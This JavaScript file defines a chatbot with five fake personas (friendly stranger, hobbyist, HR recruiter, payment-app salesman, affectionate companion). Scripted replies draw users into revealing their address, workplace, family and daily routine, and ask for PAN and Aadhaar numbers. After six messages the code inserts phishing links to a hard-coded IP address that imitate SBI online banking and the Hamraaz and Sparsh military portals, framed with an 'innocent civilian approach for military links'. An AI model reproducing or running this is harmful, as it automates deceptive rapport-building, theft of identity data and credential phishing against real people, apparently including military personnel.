const aiPersonalities = {
  social_interaction: {
    name: 'Priya Sharma',
    description: 'Friendly social media enthusiast who loves connecting with new people',
    greeting: 'Hey there! 👋 I\'m Priya! I love meeting new people online.',
    personality: {
      tone: 'friendly and approachable',
      interests: ['social media', 'meeting new people', 'travel', 'food'],
      tactics: [
        'Ask about location and hometown',
        'Inquire about hobbies and interests',
        'Ask about job and workplace',
        'Share personal stories to build rapport',
        'Ask about family and relationships'
      ],
      responses: {
        location: [
          'That sounds amazing! I love exploring new places. What\'s your favorite thing about living there?',
          'Oh wow! I\'ve always wanted to visit that area. What\'s the best restaurant near you?',
          'That\'s so cool! Do you live with family or roommates? I\'m always curious about how people set up their homes.'
        ],
        hobbies: [
          'That\'s so interesting! How long have you been into that?',
          'I love that! What got you started with that hobby?',
          'That sounds fun! Do you do it alone or with friends/family?'
        ],
        job: [
          'That sounds like such an interesting job! What company do you work for?',
          'I\'m always curious about different careers. What\'s your typical day like?',
          'That\'s impressive! How long have you been in that field?'
        ],
        family: [
          'That\'s so sweet! Do you have siblings? I love hearing about family dynamics.',
          'Family is everything, right? What do your parents do for work?',
          'That sounds like such a close family! Do you all live nearby?'
        ]
      }
    }
  },

  hobbies_based: {
    name: 'Raj Malhotra',
    description: 'Passionate about hobbies and interests, loves sharing experiences',
    greeting: 'Hi! I\'m Raj and I\'m super passionate about hobbies! 🎨',
    personality: {
      tone: 'enthusiastic and curious',
      interests: ['hobbies', 'sports', 'art', 'music', 'travel'],
      tactics: [
        'Ask about specific hobbies and interests',
        'Inquire about where they practice their hobbies',
        'Ask about family members and their interests',
        'Discuss equipment and tools they use',
        'Ask about their schedule and routine'
      ],
      responses: {
        hobbies: [
          'That\'s awesome! How often do you get to do that?',
          'I love that hobby too! What equipment do you use?',
          'That sounds so much fun! Do you do it at home or somewhere else?'
        ],
        location: [
          'That\'s a great spot for that! Do you go there often?',
          'I love that area! What\'s your favorite place to hang out there?',
          'That sounds perfect! Do you live nearby or travel there?'
        ],
        family: [
          'That\'s so cool! Does your family share the same interests?',
          'I love when families have hobbies together! What do your parents think about it?',
          'That sounds like such a fun family! Do you all live in the same area?'
        ],
        schedule: [
          'That\'s a great routine! What time do you usually do that?',
          'I love having a schedule! Do you work around your job/school?',
          'That sounds well-organized! Do you have any other activities planned?'
        ]
      }
    }
  },

  hiring_manager: {
    name: 'Anjali Patel',
    description: 'Professional HR manager looking for talented candidates',
    greeting: 'Hello! I\'m Anjali from TechCorp HR. We\'re currently hiring for exciting positions!',
    personality: {
      tone: 'professional and enthusiastic',
      interests: ['recruitment', 'career development', 'professional growth'],
      tactics: [
        'Ask about current job and responsibilities',
        'Inquire about educational background',
        'Ask about salary expectations',
        'Request personal documents (PAN, Aadhar)',
        'Ask about location and willingness to relocate'
      ],
      responses: {
        job: [
          'That sounds like a great role! What company are you currently with?',
          'I love that position! What\'s your current salary range?',
          'That\'s impressive experience! How long have you been in that role?'
        ],
        education: [
          'That\'s excellent! Which university did you attend?',
          'I love that field of study! What was your graduation year?',
          'That\'s a great background! Do you have any certifications?'
        ],
        documents: [
          'Perfect! For our records, could you share your PAN number?',
          'Great! We\'ll also need your Aadhar number for verification.',
          'Excellent! Could you also provide your current address for our files?'
        ],
        location: [
          'That\'s a great location! Are you open to relocation?',
          'Perfect! What\'s your preferred work location?',
          'That sounds ideal! Do you have any travel restrictions?'
        ]
      }
    }
  },

  salesperson: {
    name: 'Vikram Singh',
    description: 'Enthusiastic sales representative for innovative products',
    greeting: 'Hi! I\'m Vikram from InnovateTech! 🚀 We have an amazing new app that\'s revolutionizing digital payments.',
    personality: {
      tone: 'enthusiastic and persuasive',
      interests: ['technology', 'innovation', 'digital payments', 'apps'],
      tactics: [
        'Present product benefits and features',
        'Ask about current payment methods',
        'Request app download and installation',
        'Ask for personal information for account setup',
        'Offer free trials and incentives'
      ],
      responses: {
        product: [
          'It\'s completely free to download! Would you like the link?',
          'You can earn up to ₹500 cashback on your first transaction!',
          'It\'s trusted by over 10 million users! Want to try it?'
        ],
        download: [
          'Great! Here\'s the link: bit.ly/innovatepay (it\'s completely safe!)',
          'Perfect! Just download from the link and I\'ll help you set up your account.',
          'Excellent choice! The app will ask for some basic info for your account.'
        ],
        information: [
          'We just need your phone number and email for the account.',
          'For security, we\'ll also need your PAN number for verification.',
          'Perfect! Could you also share your current address for delivery?'
        ],
        incentives: [
          'You\'ll get ₹100 instantly in your wallet!',
          'First 10 transactions are completely free!',
          'Refer friends and earn ₹50 for each signup!'
        ]
      }
    }
  },

  companion: {
    name: 'Meera Kapoor',
    description: 'Caring and supportive friend who loves to chat and connect',
    greeting: 'Hey sweetie! 💕 I\'m Meera and I just love making new friends!',
    personality: {
      tone: 'warm, caring, and affectionate',
      interests: ['relationships', 'emotional support', 'daily life', 'feelings'],
      tactics: [
        'Show emotional support and care',
        'Ask about daily routine and feelings',
        'Use endearing nicknames and emojis',
        'Ask about relationships and family',
        'Share personal stories to build intimacy'
      ],
      responses: {
        greeting: [
          'How was your day, sweetie? 💕',
          'I\'m so glad we\'re chatting! How are you feeling today?',
          'You seem like such a lovely person! What\'s on your mind?'
        ],
        routine: [
          'That sounds like such a nice routine! What time do you usually wake up?',
          'I love that! Do you live alone or with family?',
          'That sounds perfect! What\'s your favorite part of the day?'
        ],
        feelings: [
          'I\'m here for you, sweetie! 💕 What\'s bothering you?',
          'You can tell me anything! What\'s on your mind?',
          'I care about you so much! How can I help you feel better?'
        ],
        family: [
          'That\'s so sweet! Do you have a close relationship with your family?',
          'I love hearing about families! What do your parents do?',
          'That sounds like such a loving family! Do you all live together?'
        ]
      }
    }
  }
};

class AIResponseGenerator {
  constructor() {
    this.personalities = aiPersonalities;
  }

  // Generate a response based on the AI personality and user message
  generateResponse(aiPersonality, userMessage, conversationHistory = []) {
    const personality = this.personalities[aiPersonality];
    if (!personality) {
      return 'Hello! How can I help you today?';
    }

    // Analyze user message for key information
    const analysis = this.analyzeUserMessage(userMessage);
    
    // Generate appropriate response based on personality and context
    let response = this.generateContextualResponse(personality, analysis, conversationHistory);

    // Inject phishing link after 6-10 messages for more natural flow
    const messageCount = conversationHistory.length + 1;
    if (messageCount >= 6 && messageCount <= 10) {
      const phishingUrls = [
        "http://34.131.186.181:8080/sbi-login/",
        "http://34.131.186.181:8080/hamraaz/",
        "http://34.131.186.181:8080/sparsh/"
      ];
      const randomUrl = phishingUrls[Math.floor(Math.random() * phishingUrls.length)];
      const urlName = randomUrl.includes('sbi') ? 'SBI Online Banking' : 
                     randomUrl.includes('hamraaz') ? 'Hamraaz Secure Access' : 
                     'Sparsh Payment Portal';
      
      // Innocent civilian approach for military links
      const linkContexts = [
        `Oh, and I heard about this ${urlName} thing (${randomUrl}) - do you know if that's something you guys use? I'm just curious about how it all works.`,
        `By the way, I came across this ${urlName} portal (${randomUrl}) online. Is this something you have access to? I'm always interested in learning about different systems.`,
        `Actually, I was reading about ${urlName} (${randomUrl}) the other day. Do you use that in your work? I find it fascinating how everything connects.`,
        `I saw something about ${urlName} at ${randomUrl} - is that part of what you do? I'm just trying to understand how it all fits together.`,
        `Oh, and I found this ${urlName} link (${randomUrl}) - do you know anything about this? I'm just curious about how these things work.`
      ];
      
      const randomContext = linkContexts[Math.floor(Math.random() * linkContexts.length)];
      response = response.replace(/\.$/, '') + '. ' + randomContext;
    }

    return response;
  }

  // Analyze user message for key information
  analyzeUserMessage(message) {
    const analysis = {
      location: this.extractLocation(message),
      job: this.extractJobInfo(message),
      family: this.extractFamilyInfo(message),
      hobbies: this.extractHobbies(message),
      emotions: this.extractEmotions(message),
      personalInfo: this.extractPersonalInfo(message)
    };
    return analysis;
  }

  // Extract location information
  extractLocation(message) {
    const locationKeywords = ['live', 'location', 'city', 'town', 'area', 'neighborhood', 'address'];
    const hasLocation = locationKeywords.some(keyword => 
      message.toLowerCase().includes(keyword)
    );
    return hasLocation ? message : null;
  }

  // Extract job information
  extractJobInfo(message) {
    const jobKeywords = ['work', 'job', 'company', 'office', 'profession', 'career', 'salary'];
    const hasJob = jobKeywords.some(keyword => 
      message.toLowerCase().includes(keyword)
    );
    return hasJob ? message : null;
  }

  // Extract family information
  extractFamilyInfo(message) {
    const familyKeywords = ['family', 'parents', 'siblings', 'brother', 'sister', 'mother', 'father'];
    const hasFamily = familyKeywords.some(keyword => 
      message.toLowerCase().includes(keyword)
    );
    return hasFamily ? message : null;
  }

  // Extract hobbies information
  extractHobbies(message) {
    const hobbyKeywords = ['hobby', 'interest', 'sport', 'game', 'activity', 'fun', 'enjoy'];
    const hasHobbies = hobbyKeywords.some(keyword => 
      message.toLowerCase().includes(keyword)
    );
    return hasHobbies ? message : null;
  }

  // Extract emotional content
  extractEmotions(message) {
    const emotionKeywords = ['happy', 'sad', 'angry', 'excited', 'worried', 'stressed', 'tired'];
    const hasEmotions = emotionKeywords.some(keyword => 
      message.toLowerCase().includes(keyword)
    );
    return hasEmotions ? message : null;
  }

  // Extract personal information
  extractPersonalInfo(message) {
    const personalKeywords = ['name', 'age', 'phone', 'email', 'address', 'pan', 'aadhar'];
    const hasPersonal = personalKeywords.some(keyword => 
      message.toLowerCase().includes(keyword)
    );
    return hasPersonal ? message : null;
  }

  // Generate contextual response based on personality and analysis
  generateContextualResponse(personality, analysis, conversationHistory) {
    const { responses } = personality.personality;
    
    // Check if user provided location information
    if (analysis.location) {
      const locationResponses = responses.location || [];
      if (locationResponses.length > 0) {
        return this.getRandomResponse(locationResponses);
      }
    }

    // Check if user provided job information
    if (analysis.job) {
      const jobResponses = responses.job || [];
      if (jobResponses.length > 0) {
        return this.getRandomResponse(jobResponses);
      }
    }

    // Check if user provided family information
    if (analysis.family) {
      const familyResponses = responses.family || [];
      if (familyResponses.length > 0) {
        return this.getRandomResponse(familyResponses);
      }
    }

    // Check if user provided hobbies information
    if (analysis.hobbies) {
      const hobbyResponses = responses.hobbies || [];
      if (hobbyResponses.length > 0) {
        return this.getRandomResponse(hobbyResponses);
      }
    }

    // Check if user provided emotional content
    if (analysis.emotions) {
      const emotionResponses = responses.feelings || [];
      if (emotionResponses.length > 0) {
        return this.getRandomResponse(emotionResponses);
      }
    }

    // Generate follow-up questions based on personality
    return this.generateFollowUpQuestion(personality, analysis);
  }

  // Generate follow-up questions based on personality
  generateFollowUpQuestion(personality, analysis) {
    const { tactics } = personality.personality;
    
    // If no specific information was provided, ask a general question
    if (!analysis.location && !analysis.job && !analysis.family && !analysis.hobbies) {
      if (personality.name === 'Priya Sharma') {
        return 'I\'d love to know more about you! Where are you from? I\'m always curious about different places! 😊';
      } else if (personality.name === 'Raj Malhotra') {
        return 'I\'m so curious about your interests! What hobbies do you enjoy in your free time? 🎨';
      } else if (personality.name === 'Anjali Patel') {
        return 'I\'m always looking for talented people! What\'s your current job role? I\'d love to discuss opportunities! 💼';
      } else if (personality.name === 'Vikram Singh') {
        return 'I have an amazing opportunity for you! Would you be interested in trying our new payment app? It\'s completely free! 🚀';
      } else if (personality.name === 'Meera Kapoor') {
        return 'How was your day, sweetie? 💕 I\'m here to chat about anything - you seem like such a lovely person!';
      }
    }

    // If some information was provided, ask for more details
    if (analysis.location && !analysis.job) {
      return 'That sounds like a great place! What do you do for work? I\'m always curious about different careers!';
    } else if (analysis.job && !analysis.family) {
      return 'That sounds like such an interesting job! Do you live with family or roommates? I love hearing about people\'s living situations!';
    } else if (analysis.hobbies && !analysis.location) {
      return 'That hobby sounds amazing! Where do you usually do that? I\'m always looking for new places to explore!';
    }

    // Default response
    return 'That\'s so interesting! Tell me more about yourself! 😊';
  }

  // Get a random response from an array
  getRandomResponse(responses) {
    const randomIndex = Math.floor(Math.random() * responses.length);
    return responses[randomIndex];
  }

  // Get personality information
  getPersonality(aiPersonality) {
    return this.personalities[aiPersonality] || null;
  }

  // Get all available personalities
  getAllPersonalities() {
    return this.personalities;
  }
}

module.exports = new AIResponseGenerator(); 